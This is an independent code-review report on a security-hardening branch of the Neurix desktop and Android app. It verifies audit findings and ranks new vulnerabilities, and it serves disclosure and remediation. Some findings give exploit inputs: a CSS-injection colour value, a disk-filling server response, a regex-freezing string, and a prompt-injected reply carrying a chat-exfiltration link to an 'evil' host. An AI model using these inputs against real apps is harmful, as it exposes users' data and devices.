# Independent review of the `security/hardening-audit` branch

- Reviewed: `security/hardening-audit` at `d89c7d7` (15 commits on `main` at `ef08bbb`), draft PR [#13](https://github.com/Razee4315/neurix/pull/13)
- Reviewer branch: `review/security-audit-verification`, draft PR [#14](https://github.com/Razee4315/neurix/pull/14) (do not merge)
- Date: 2026-10-24
- Method: code, git history, and GitHub Actions logs only. I treated `SECURITY_AUDIT.md` as a set of claims to test, not as evidence. I built and ran nothing locally except a 3-second node timing of two regexes and a Python config check. Every build and test ran on GitHub Actions.

---

## a. Verdict: APPROVE WITH CHANGES

The 11 findings are real, and the branch is strictly safer than `main`. The executable guard I added fails on `main` with 11 problems and passes on the branch with 0 ([run 40028783164](https://github.com/Razee4315/neurix/actions/runs/40028783164)). The full suite is green on the branch head. No fix breaks the app as far as code and CI can show.

It should still not merge as it stands, for four reasons:
- **N-04 is only half fixed.** The new download cap is measured against the server's own `Content-Length`. A hostile or broken server that sends a huge `Content-Length` still fills the disk.
- **The new docs make false security claims.** `SECURITY.md` and `SECURITY_AUDIT.md` say gitleaks scans "the full git history". The job actually scanned only the 15 PR commits, and on push only the last commit (`--log-opts=-1`). `SECURITY.md` also says every model is checked against a pinned SHA-256, which is false for the 8 legacy models (D-02). The audit's own N-10 was a false claim in that same file.
- **The new backup path still lets a hostile file crash or freeze the app.** A 512 MB cap with parsing before the count check can run a phone out of memory. Unbounded character fields persist into settings, and reset does not clear them. Unbounded message text hits a quadratic markdown regex that freezes the UI.
- **History hygiene.** The N-01 commit `b85ddc3` does not compile (E0382). The fix arrived four commits later in `5779a88`, which is labelled as a security fix.

None of these is hard to fix. The list is in section e.

---

## b. Per-finding verification

Notes on the "Regression test" column:
- "Config-only" means there is no executable test on the audited branch.
- "Helper-level" means the tests exercise new pure helpers, not the IPC, dialog, or async path the fix lives in.
- I ported the helpers and tests onto `main`'s copies of the files (`review/security-audit-verification`, commit `test(review): port audit helpers...`). They compile and pass there, which proves only that the helpers work; there was nothing on `main` for them to fail against. To show the bugs exist on `main`, I added tests that call `main`'s real code: `review_main_behaviour::main_verify_gguf_accepts_an_oversized_file` and `review_main_behaviour::main_ipc_accepts_backup_over_the_conversation_cap`. I also added `.github/review/config_guard.py` as the executable check for the config-only findings.

| ID | Claim verified | Fix correct | Best practice | Regression test meaningful | Evidence |
|---|---|---|---|---|---|
| N-01 | **Yes.** `main:src-tauri/capabilities/main.json:19-23` grants `fs:default`, `fs:allow-read-text-file`, `fs:allow-write-text-file`, `dialog:*`, unscoped. | **Yes.** `main.json` is the only capability file, and no `tauri.*.conf.json` adds permissions (the android and ios files only hold build keys). `generate_handler!` dropped `export_data`/`import_data`. The Rust side of the new commands (spawn_blocking, `AppHandle` clone, `take(MAX+1)`, `truncate`) is correct. I checked tauri-plugin-fs 2.4.5's `android_mode()`: write+truncate maps to `"wt"`, so Android SAF overwrites truncate properly. | **Yes** for the capability design: dialog plus IO in Rust, and the webview never sees a path. | **Partial.** Helper-level, and three of the four named tests do not test what their names say (section c). The capability removal is config-only on the branch; I added `config_guard.py`, which fails on `main` and passes on the branch. | `b85ddc3`, `5779a88`; guard [run 40028783164](https://github.com/Razee4315/neurix/actions/runs/40028783164) |
| N-02 | **Yes.** `main:src-tauri/tauri.conf.json:21` has `script-src 'self' 'unsafe-inline'`. | **Yes.** No platform override sets `app.security`. The production bundle has no inline script and no eval (sub-review of `index.html` and the bundle). | **Partial.** `base-uri 'none'` and `form-action 'none'` are still missing (`default-src` does not cover them), and there is no `devCsp`. | **No** on the branch (config-only). My guard covers it. | `a87b309`; `config_guard.py` |
| N-03 | **Yes.** `main:src-tauri/tauri.conf.json:6` has `withGlobalTauri: true`, and nothing reads `window.__TAURI__` (re-grepped). | **Yes.** | **Yes.** | **No** on the branch (config-only). My guard covers it. | `a87b309` |
| N-04 | **Yes.** On `main`, the write loop has no cap and `verify_gguf` rejects only short files. My test calling `main`'s real `verify_gguf` accepts a file 16 times the expected size. | **Partial.** The cap is `total_bytes + size_slack(model.size_bytes)`, and `total_bytes` comes from the server's `Content-Length` (`download.rs:173-184,242`). A server that sends `Content-Length: 10 TB` gets a 10 TB budget. The final size check also compares against the server's number (`download.rs:297`). On a cap breach the oversized `.part` is left on disk. The SHA-256 pin does not help here, because it is checked only after the whole file has been written. | **No.** The cap should come from the catalog, `model.size_bytes`, as the trusted baseline. | **Partial.** Helper-level; the async loop cap has no test. `cap_follows_content_length_so_a_huge_claim_disables_it` documents the gap. | `ae05d10`; `download.rs:173-184,242,297` |
| N-05 | **Yes.** The audit job that runs on this branch's pull requests is green at `d89c7d7`; the zod advisory failed in [run 40022642930](https://github.com/Razee4315/neurix/actions/runs/40022642930) and was fixed. | **Yes.** No `overrides` were added. The fix moves to react-router 7 and vitest 5, which are major version bumps (section h). | **Yes.** | **Partial.** The guard is the npm-audit CI job, and it fails only at high or critical. | [run 40023839969](https://github.com/Razee4315/neurix/actions/runs/40023839969) |
| N-06 | **Yes.** [run 40011951371](https://github.com/Razee4315/neurix/actions/runs/40011951371) failed `cargo audit` at `91b3979`. | **Yes.** Lockfile-only parent bumps, and the Engine and Android jobs build them. | **Yes.** | **Partial.** The guard is the `cargo audit` job; unmaintained-crate warnings do not fail it. | `699a843`; [run 40023833827](https://github.com/Razee4315/neurix/actions/runs/40023833827) |
| N-07 | **Yes.** `main:.github/workflows/ci.yml` has no `permissions:` key. | **Partial.** `contents: read` was added. But `ci.yml` itself is still tag-pinned (`actions/checkout@v4`, `dtolnay/rust-toolchain@stable`, `swatinem/rust-cache@v2`, `actions/setup-node@v4`, `actions/cache@v4`), even though it was in scope; only release, android, and site were off limits. It also calls `android.yml` with `secrets: inherit` (`ci.yml:144-145`), so every same-repo PR runs tag-pinned third-party actions next to the release keystore (NF-6). | **Partial.** | **No** (config-only). My guard checks for the `permissions` key only. | `faf1dff`; `ci.yml:44-108` |
| N-08 | **Yes.** `main:data_cmds.rs:52`: `import_data` takes a `Backup` deserialized from webview JSON, with no size or count bound. My test shows that path accepts 10,001 conversations. | **Partial.** Both caps exist, but 512 MB is read into memory and fully parsed before the count check runs. That is several GB of heap on a phone (NF-2). Character fields and message length stay unbounded (NF-3, NF-4). | **Partial.** A streaming or bounded deserializer and a lower cap would be best practice. | **Partial.** `conversation_count_is_capped` is fine. `size_limit_leaves_room_for_real_backups` only asserts a constant. `future_versions_are_preserved...` tests a copy of the gate written inside the test module, not `apply_backup`. | `91b3979`, `9ba92e8`; `data_cmds.rs:20,205-219,303-315` |
| N-09 | **Yes.** `main:main.json:16-17` grants `opener:default` plus an unscoped `opener:allow-open-url`. | **Yes.** It is now scoped to `https://**`. | **Partial.** `https://**` still lets XSS or a prompt-injected link open any site. A host allowlist plus a confirm dialog for model-authored links would be tighter (NF-11). `http://` links in replies now fail silently. | **No** on the branch (config-only). My guard covers it. | `b85ddc3` |
| N-10 | **Yes.** `main:SECURITY.md:10` says chats are "encrypted at rest by the OS file system". | **Partial.** The new text adds three new inaccuracies: (1) every model is "verified against a SHA-256 checksum pinned in the app's catalog", which is false for the 8 legacy models; (2) gitleaks runs "over the full git history", which is false; (3) the location is given as `%APPDATA%`, but the code uses `app_local_data_dir()`, which is `%LOCALAPPDATA%`. It also omits Android Auto Backup (NF-5). | **No.** | n/a (docs) | `fafb89a`; `SECURITY.md` diff |
| N-11 | **Yes.** `main:docs/ARCHITECTURE.md:216-224`. | **Yes.** | **Yes.** | n/a (docs) | `f4f2425` |

---

## c. Process issues

1. **The gitleaks claim is false.** The job is named "Secret scanning (full history)" and both reports call it full history. The logs show otherwise:
   - pull_request [run 40023839969](https://github.com/Razee4315/neurix/actions/runs/40023839969) ran `--log-opts=--no-merges --first-parent b85ddc3^..d89c7d7`, which is the 15 PR commits.
   - push [run 40023833827](https://github.com/Razee4315/neurix/actions/runs/40023833827) ran `--log-opts=-1`, which is one commit.

   `fetch-depth: 0` does not change what gitleaks-action scans; only `workflow_dispatch` and `schedule` scan everything. I ran a real scan, `gitleaks git --log-opts=--all` over every branch (204 commits), and it found **no leaks** ([run 40028783164](https://github.com/Razee4315/neurix/actions/runs/40028783164)). So the conclusion holds, but the evidence offered for it did not.
2. **The commit that fixes the High finding does not compile.** `b85ddc3` moves `app` into the import closure and then borrows it (E0382; [run 40011951712](https://github.com/Razee4315/neurix/actions/runs/40011951712), `data_cmds.rs:208`). Commits `b85ddc3` through `699a843` cannot be built or bisected. `5779a88` is a compile fixup labelled `fix(security):` and should have been squashed. The other 14 commits are Conventional Commits with one change each.
3. **Tests that do not test what their names say.**
   - `rejects_garbage`: `{"kind":"other.backup"}` fails because `version` and `exported_at` are missing. `parse_backup` never checks `kind`. My test `kind_check_in_rejects_garbage_is_not_what_rejects_it` proves this.
   - `future_versions_are_preserved_for_the_command_to_reject` asserts against `apply_backup_decision`, a copy of the gate written inside the test module. If the real `apply_backup` gate were deleted, the test would still pass.
   - `size_limit_leaves_room_for_real_backups` builds a two-conversation backup in a variable named `hundred`, then asserts `MAX_BACKUP_BYTES > 100 MiB`, a constant.
4. **The honesty section was wrong about the binary.** "A prebuilt binary IS committed" is false. `libneurix_tauri.so` is a git symlink (mode `120000`, 93 bytes) pointing at `C:/Users/saqla/Desktop/idea/src-tauri/target/aarch64-linux-android/release/libneurix_tauri.so`. CI rebuilds the library and re-links it (Android job log: `symlinking lib ... in jniLibs dir`). This is harmless, but it leaks a local username and path. It is still a reason to read files rather than guess.
5. **Stale generated files were relied on as evidence.**
   - `src-tauri/gen/schemas/capabilities.json` was last committed in `5129949`. It still lists `shell:*`, `http:*`, `fs:allow-remove`, and others, so it does not reflect the capabilities that actually ship.
   - `gen/android/app/src/main/assets/tauri.conf.json` is version 0.3.0 with `'unsafe-eval'` and `withGlobalTauri: true`.

   Neither file is what ships; Tauri compiles the ACL and CSP from the source config. But anyone auditing from the `gen/` files sees the wrong picture. Gitignore them or regenerate them.
6. **Docs fix introduced new false claims** (N-10 row): the SHA-256-for-every-model and full-history claims.
7. **The audit missed exhaustion and DoS paths in its own new code.** The backup path it hardened still has the issues in NF-2, NF-3 and NF-4.
8. **Mischaracterised behaviour change.** The brief says the export file name "changed to be generated in Rust". The format is identical: `neurix-backup-YYYY-MM-DD.json`, UTC date in both, from `toISOString().slice(0,10)` before and `Utc::now()` now. The real user-visible changes are in section h.
9. **Semgrep "promote to blocking by removing `continue-on-error`" would not work.** `semgrep scan` exits 0 when it finds issues unless `--error` is passed (`security.yml:110`). Removing `continue-on-error` would still never fail the job.

Checked and fine:
- `main` is untouched at `ef08bbb`.
- No new tags or releases; v0.5.1, published 2026-10-23T16:49Z, predates the first branch commit at 19:20Z.
- The PR's commit list matches `git log main..security/hardening-audit` exactly, with merge-base `ef08bbb`, so there was no force-push.
- `release.yml`, `android.yml` and `site.yml` are byte-identical to `main` (`git diff main --stat` is empty for them).
- No `.env`, keystore, `.pem`, or `keystore.properties` file was ever added; only `.env.example`.
- No `*.test.*` file is in the diff, and the diff adds no `#[ignore]`, `.skip`, or `.only`. The 66 vitest tests and the 49 + 1 ignored Rust tests (`real_model_end_to_end`, run separately against two real models) all pass in CI.

---

## d. Newly found vulnerabilities (ranked)

None is Critical or High. Each item lists the issue, the exploit path, and a proposed fix.

### Medium

**NF-1. The download cap is keyed to the server's `Content-Length`, so N-04 is incomplete.** `src-tauri/src/models/download.rs:173-184, 242, 297`
- **Exploit:** a compromised CDN or a hostile mirror answers with `Content-Length: 10000000000000` and streams endless bytes. `total_bytes` is about 10 TB and the cap never trips, so the disk fills. This applies to pinned-hash models too, because the hash is checked after the transfer.
- Related problems:
  - On a cap breach the oversized `.part` stays on disk.
  - `existing_bytes + content_length` and `total_bytes + slack` are unchecked additions; they wrap in release builds.
  - On a 416 response the size check compares the file with itself.
  - A 206 `Content-Range` start is never checked against `existing_bytes`.
- **Fix:**
  - Compute `cap = model.size_bytes.saturating_add(size_slack(model.size_bytes))` from the catalog only.
  - Reject up front if `Content-Length` is greater than `cap`.
  - Delete the `.part` on a breach.
  - Use `saturating_add` throughout.
  - Validate `Content-Range`.
  - Check free space against `cap` before starting.

**NF-2. Backup import can run a phone out of memory before the count cap runs.** `src-tauri/src/commands/data_cmds.rs:20, 205-219`
- **Exploit:** the user is sent a "backup" and imports it. A 512 MB file of about 150-byte minimal records parses into roughly 3.5M structs, several GB of heap, before `validate_backup` checks the 10,000 limit. The phone's low-memory killer then kills the app, and with `panic = "abort"` an allocation failure is an outright crash.
- **Fix:**
  - Lower the cap to 64-128 MB.
  - Deserialize `conversations` with a bounded visitor that errors at N+1 elements, so the count is enforced while parsing.
  - Or stream with `serde_json::Deserializer::from_reader`.

**NF-3. A quadratic regex in the markdown renderer allows a persistent UI freeze.** `src/pages/chat/Markdown.tsx:172` (`INLINE`) and `:216` (`isTableDivider`)
- I measured it in node: 20,000 `[` characters take 642 ms, and 20,000 spaces before a non-matching character take 589 ms. Doubling the input roughly quadruples the time, so 1 MB would take tens of minutes.
- **Exploit:** a backup message, or a saved conversation, contains one long line of `[`. Opening that chat freezes the webview, and if it is the newest chat it may freeze on every launch. A streamed model reply full of `[` (capped at 2,048 tokens) is re-parsed on every animation frame and stutters.
- **Fix:**
  - Bound the pattern: `\[([^\]\n]{1,200})\]\((https?:\/\/[^\s)]{1,2048})\)`, and `[^*\n]{1,500}` for bold and italic.
  - Render lines longer than about 8k characters as plain text.
  - Cap message length in Rust on save and import, and clamp `updated_at` values that are in the future.

**NF-4. Unbounded character fields are stored permanently, and an imported `accent_color` can inject CSS.**
- Locations: `src-tauri/src/settings.rs:105-138` (`sanitize`), `src-tauri/src/characters.rs:8-35`, `src-tauri/src/commands/data_cmds.rs:103-121`, `src/pages/CharacterEditPage.tsx:494` with use sites at 149-158.
- `sanitize()` never bounds `id`, `icon`, `accent_color`, `created_at`, `last_used_at`, `last_model_id`, or `active_character_id`.
- **Exploit 1:** a backup character with a 400 MB `icon` lands in the settings store. Every settings read then re-parses it, and `reset_settings` keeps `custom_characters` (`settings.rs:192-203`), so reset does not fix it.
- **Exploit 2:** `accent_color: "red;position:fixed;inset:0;z-index:9999"` reaches styled-components through `draftFrom` without validation. That allows UI redress inside the character editor. The CSP blocks off-site `url()` loads, so nothing can be exfiltrated. Share codes are safe, because `characterShare.ts` validates hex.
- **Fix:** in `sanitize`:
  - `id`: `custom:` plus at most 64 characters from `[A-Za-z0-9_-]`;
  - `icon`: on the allowlist, at most 32 characters;
  - `accent_color`: matching `^#[0-9a-fA-F]{6}$`, else `None`;
  - timestamps: at most 40 characters and valid RFC 3339;
  - optional ids: at most 128 characters.

  In `draftFrom`, run the value through the same check as `accentOf()`. Also dedupe the incoming characters by id.

**NF-5. Android Auto Backup is on, so chats can leave the device.** `src-tauri/gen/android/app/src/main/AndroidManifest.xml:12-17`
- The manifest sets no `android:allowBackup`, `fullBackupContent`, or `dataExtractionRules`, and targetSdk is 36. App-private data, including the chat JSON files and settings, therefore goes to Google Drive backup and device-to-device transfer. On Android 9-11, `adb backup` also works without root. This contradicts "no data is sent to external servers" and the website's claims.
- **Fix:** set `android:allowBackup="false"`, or add `dataExtractionRules` (API 31+) and `fullBackupContent` that exclude the chats, the settings store, and the models. Then document it in `SECURITY.md`.

**NF-6. PR builds use the release signing key, and run tag-pinned third-party actions with it.**
- Locations: `.github/workflows/ci.yml:143-145` (`secrets: inherit`), and `.github/workflows/android.yml:65,76,103,109,116,140-200,223`.
- The PR run [40023840010](https://github.com/Razee4315/neurix/actions/runs/40023840010) decoded the real keystore ("Release keystore configured"), signed the APK and AAB, and uploaded them as a run artifact.
- **Exposure:**
  - Any push of a same-repo PR branch runs `android-actions/setup-android@v3`, `dtolnay/rust-toolchain@stable` and `swatinem/rust-cache@v2` (mutable tags) next to `ANDROID_KEYSTORE_BASE64` and the passwords. A compromised tag can exfiltrate the Play signing key.
  - Release-signed APKs are built from unreviewed PR code.
  - Fork PRs are safe: GitHub passes them no secrets, so they fall back to the debug key.
- **Fix:**
  - Do not inherit secrets on `pull_request`: pass them only from `release.yml`, or gate the signing step on `github.event_name != 'pull_request'`.
  - SHA-pin every action in `ci.yml` and `android.yml` (D-01).
  - Put signing behind a protected GitHub Environment.

### Low

- **NF-7. Semgrep can never block** (`security.yml:110`). Add `--error`, then drop `continue-on-error` after triage.
- **NF-8. `run_inference` input has no size limit, and trimming is quadratic** (`chat_cmds.rs:77-104`, `engine.rs:403-440`).
  - XSS, or a buggy UI, can send a 100k-entry `history`. `fit_prompt` drops one exchange per iteration and re-renders and re-tokenizes each time, without checking cancel, so the model stays "busy" and `stop_inference` cannot interrupt it.
  - Fix: cap `history.len()` and total bytes at the command boundary, and check the cancel token in the loop.
- **NF-9. minijinja has no fuel or output limit** (`inference/template.rs:70`, `Cargo.toml:34`).
  - A GGUF chat template with nested `range` loops can hang or exhaust memory inside spawn_blocking. Only the 8 legacy models lack hash pinning (D-02).
  - Fix: enable the `fuel` feature with `env.set_fuel(...)` and cap the rendered length.
- **NF-10. Model lifecycle races** (`model_cmds.rs:155-178,186+`).
  - `delete_model` does not check `active_downloads` and can delete a model that is mid-download.
  - Two concurrent `load_model` calls can load two models into RAM, which can trip the low-memory killer on a phone.
  - Fix: track a loading flag in `AppState`, and refuse deletion while a download is active.
- **NF-11. Model-authored links can exfiltrate chat content through a click** (`Markdown.tsx:172-178`).
  - A prompt-injected reply can render `[docs](https://evil/?q=<chat>)`, and one click opens it.
  - `http://` links render but silently do nothing. A middle-click (`auxclick`) bypasses `preventDefault` (unconfirmed on WebView2).
  - Fix: show the host and ask before `openUrl`, handle `onAuxClick`, and add an `on_new_window` deny in Rust.
- **NF-12. Download cancel races with the pre-checks** (`src/context/DownloadContext.tsx:455-497`).
  - A cancel during the `getSettings` and `checkAvailableSpace` awaits is ignored, and the download then runs invisibly.
  - Fix: use a per-start generation token.
- **NF-13. The chat draft persists in `localStorage` when "Save chat history" is off, and "Clear history" does not remove it** (`ChatPage.tsx:118-121`).
- **NF-14. `check_available_space` overflows** (`settings_cmds.rs:88`): `required_bytes + 100_000_000` wraps for large input. Use `saturating_add`.
- **NF-15. The download client accepts any redirect target** (`download.rs:91-95`).
  - reqwest's default policy follows 10 redirects with no scheme restriction.
  - The URL uses mutable `resolve/main`.
  - Fix: `.https_only(true)`, and pin each catalog entry to a commit revision.
- **NF-16. The Android JS bridge is exposed to every frame and origin** (`MainActivity.kt:9-12`, `DownloadBridge.kt`).
  - Its only effect is a 6-hour wakelock and WiFi lock (battery). It takes no URL or path.
  - Fix: check the origin, or use `addWebMessageListener` with an allowed-origin rule.
- **NF-17. Android release hygiene** (`android.yml`, `gradle-wrapper.properties`).
  - A release silently falls back to the debug key when the secrets are missing.
  - Passwords go on the `jarsigner`/`apksigner` command line.
  - The Gradle wrapper has no `distributionSha256Sum` and no wrapper validation.
- **NF-18. `site.yml:16-19` grants `pages: write` and `id-token: write` to the whole workflow,** including the `npm ci` build job. Move them to the deploy job.

### Info

- CSP is missing `base-uri 'none'; form-action 'none'`.
- The stale `gen/` files are covered in section c.5.
- The `.so` symlink leaks a local path; `arm64-v8a/` is not gitignored.
- `tokenize(..., parse_special = true)` (`engine.rs:382`) lets pasted text inject chat-template control tokens.
- `validate_id` accepts Windows reserved names (`CON`, `NUL`), which only makes that entry fail to save.
- The CI test models are fetched from `resolve/main` with no checksum and cached under a fixed key (`ci.yml:115-127`).
- `cargo clippy` does not fail the build (no `-D warnings`).
- `AboutPage.tsx:123` has a `window.open` fallback that should be removed.
- Raw backend error strings are shown in the UI (not XSS, since React escapes them).
- `website/tools/subpath.mjs` is a dev server with path traversal that binds all interfaces (dev only).
- The website has no CSP meta.

Checked and clean:
- No `std::process::Command` anywhere.
- Every model-id path is gated by catalog membership, and conversation ids are validated on load, save, delete and import.
- Download URLs come only from catalog constants (no SSRF from IPC).
- Nothing in the app uses `dangerouslySetInnerHTML`, `innerHTML`, eval, or `javascript:`.
- The share-code parser is strict; there is no prototype pollution.
- `mockTauri` is excluded from production (a `import.meta.env.DEV` dynamic import).
- No prompts are logged; llama.cpp logs are forwarded at warn and error only.
- The website's `innerHTML` uses take only committed JSON.
- No script injection in any workflow: `inputs.release_version` is passed through `env`.

---

## e. Required before merge vs nice to have

**Required before merge**
1. NF-1: cap the download against the catalog size, delete the `.part` on a breach, and use saturating arithmetic.
2. Fix the false claims in `SECURITY.md` and `SECURITY_AUDIT.md`:
   - the legacy models have no pinned SHA-256;
   - gitleaks does not scan full history;
   - the data path is `%LOCALAPPDATA%`.

   Either make the gitleaks claim true (add a `schedule`/`workflow_dispatch` full scan, or run `gitleaks git --log-opts=--all` as in `review-verification.yml`) or reword it.
3. NF-2, NF-3 and NF-4 in the new backup path:
   - a lower cap and a bounded parse;
   - a per-message length cap on import and save;
   - bounding and validating every character field in `sanitize()`;
   - a linear markdown regex.
4. Squash `5779a88` into `b85ddc3`, so every commit builds. Since this rewrites the PR branch, the owner must do it deliberately.
5. Fix or rename the three misleading tests (section c.3), and add a real `apply_backup` gate test (extract the gate into a function the command calls).
6. Add `--error` to Semgrep, so that "advisory until triaged" has a path to blocking.
7. Parent the native backup dialogs to the main window on desktop (section h). This is a functional regression from the N-01 fix.

**Nice to have** (or a follow-up PR)
- NF-5, Android backup exclusion. A privacy-first app should treat it as close to required.
- NF-6, no signing secrets on PR builds. It is in the owner-gated workflows (see f).
- SHA-pin `ci.yml`'s actions (still in scope for this branch).
- Add `config_guard.py`, or an equivalent, to `security.yml` as a permanent regression guard for the config-only findings.
- NF-7 through NF-18, and the Info items.
- Gitignore or regenerate the stale `gen/schemas/capabilities.json` and `assets/tauri.conf.json`, and drop the `.so` symlink.

---

## f. Manual steps for the repo owner

- **Secrets:** nothing needs rotating. A full-history scan of all branches with gitleaks 8.24.3 found no leaks ([run 40028783164](https://github.com/Razee4315/neurix/actions/runs/40028783164)). But the release keystore has been used on PR runs that execute tag-pinned third-party actions (NF-6). If you consider that exposure unacceptable, rotate the upload key through Play Console's upload-key reset. Otherwise, at least stop inheriting secrets into PR runs.
- **D-01 (Medium), mutable tags in release, android and site:** accept the audit's pasted SHAs. It is more urgent than stated because `android.yml` also runs on every PR with signing secrets (NF-6). Also pin `ci.yml`.
- **D-02 (Low), 8 legacy models without pinned SHA:** pin their hashes, or hide them from `download_model` if they are not needed. The ETag fallback probably never fires after HF's 302: `x-linked-etag` is on the redirect response, which reqwest consumes. That part is unconfirmed, but if true, those downloads are integrity-checked only by TLS.
- **D-03 (Info), no signed updater:** accept for now. If an updater is added later, use Tauri's signed updater with an offline key.
- **D-04 (Info), Vite dev server on 0.0.0.0:** accept, but only on trusted networks; prefer `--host` only when testing on a device.
- **D-05 (Info to Low), `release.yml` pushes to main with a write token:** add branch protection on `main` that requires PR review, and allow only the release bot to bypass it. Or bump the version in a release PR instead.
- **New: NF-5.** Decide whether chats may go into Android cloud backup, then set the manifest to match and say so in `SECURITY.md` and the privacy policy.
- **New: NF-6.** Move Android signing into a protected Environment that only `release.yml` on `main` can use.
- **New:** close draft PR #14 and delete `review/security-audit-verification` once this report has been read. It exists only for the review.

---

## g. Summary

- **Verdict:** APPROVE WITH CHANGES.
- **Original findings:** 11 of 11 confirmed real. Fixes: 7 correct (N-01, N-02, N-03, N-05, N-06, N-09, N-11) and 4 partial (N-04, N-07, N-08, N-10).
- **New findings:** 0 Critical, 0 High, 6 Medium (NF-1 to NF-6), 12 Low (NF-7 to NF-18), about 11 Info.
- **Regression-test gaps:**
  - Config-only on the branch: N-02, N-03, N-07, N-09, and the N-01 capability half. These are now covered by the reviewer's `config_guard.py`, which fails on `main` and passes on the branch.
  - Helper-level only: N-01 (backup IO), N-04 (loop cap untested) and N-08 (IPC, dialog and FS untested).
  - Three tests are misleading.
  - No frontend test covers `dataService`.
- **Top 5 fixes before merge:**
  1. NF-1: download cap from the catalog size, not `Content-Length`.
  2. Correct the false SHA-256 and gitleaks "full history" claims in `SECURITY.md` and `SECURITY_AUDIT.md`, or make gitleaks really scan full history.
  3. NF-2, NF-3, NF-4: bounded backup parsing, message and character field limits, and a linear markdown regex.
  4. Squash the non-compiling `b85ddc3` with `5779a88`.
  5. Replace the three hollow tests with tests of the real gate, and add `--error` to Semgrep.

### Appendix: reviewer CI evidence (draft PR #14)

| Check | Result | What it shows |
|---|---|---|
| Config regression guard, [run 40028783164](https://github.com/Razee4315/neurix/actions/runs/40028783164) | pass | `origin/main`: 11 problems (fs and dialog grants, opener default and unscoped, `withGlobalTauri`, `unsafe-inline`, no `ci.yml` permissions). `origin/security/hardening-audit`: 0. |
| gitleaks full history, all branches (same run) | pass | 204 commits scanned, about 4.12 MB, "no leaks found". |
| CI Engine, ported tests on `main`, [run 40028783167](https://github.com/Razee4315/neurix/actions/runs/40028783167) | pass: 53 passed, 0 failed, 1 ignored; both real-model runs passed (50.7 s, 20.9 s); Android APK+AAB built | The 8 ported tests (5 in `data_cmds::tests`, 3 in `download::ported_tests`) pass on `main`'s files, along with the 4 reviewer tests. The `review_main_behaviour` tests pass, confirming that `main`'s `verify_gguf` accepts a file 16 times too large and that `main`'s IPC deserialization accepts 10,001 conversations. |
| CI Frontend (same run) | pass | lint, 66 tests, tsc, build |

---

## h. Functionality and behaviour changes users could notice

- **Backup export and import now use a native dialog opened from Rust.** The file name format is unchanged (`neurix-backup-YYYY-MM-DD.json`, UTC date).
  - The backup snapshot is now taken after the user picks a location, not before. That is harmless.
  - **Regression (confirmed in source, not run):** the old JS path parented the dialog to the calling window (tauri-plugin-dialog 2.6.0 `commands.rs:131,231`, `set_parent(&window)`). The new Rust path in `data_cmds.rs:140-148,189-193` never calls `set_parent`. On Windows the dialog is no longer modal to the app, and it can open behind the main window. `SettingsPage`'s busy guards prevent a double export. Fix: `.set_parent(&app.get_webview_window("main").unwrap())`, behind `#[cfg(desktop)]`.
  - The invalid-file message changed from "That file isn't valid JSON." to "This file is not a valid Neurix backup."
- **`http://` links in model replies now do nothing when clicked.** The opener scope is `https://**`, and the error is swallowed.
- **`react-router-dom` 6 to 7 and `vitest` 3 to 5 are major upgrades,** taken to clear the npm advisories. Lint, tsc, 66 tests and the build are green, but routing was never exercised in a running app.
- **No webview fetch to huggingface.co** (dropped from `connect-src`). Grep confirms the frontend makes none.
- **Dev mode:** no `devCsp` is set. If Tauri enforces the CSP under `tauri dev`, the inline React-refresh preamble could be blocked (unconfirmed, dev only).
- **CI on the audited head `d89c7d7` is green** ([run 40023840010](https://github.com/Razee4315/neurix/actions/runs/40023840010)). I checked the logs, not just the summary:
  - Frontend: "Checked 72 files", "Tests 66 passed (66)", build OK.
  - Engine: 49 passed and 1 ignored, then `real_model_end_to_end` passed on Qwen3.5-0.8B (53.8 s) and LFM2.5-1.2B (20.2 s); clippy ran.
  - Android: `tauri android build --target aarch64` compiled the Rust library, re-linked jniLibs, and produced a 15 MB APK and a 34 MB AAB.
  - Security, push and PR: all five jobs passed, with the gitleaks scope caveat in section c.1.
- **Still never exercised at runtime by anyone:** the export and import clicks on Windows and Android (including SAF `content://`), the CSP on a real WebView2 and Android WebView, and react-router 7 navigation. One manual smoke test on each platform is needed before merge.
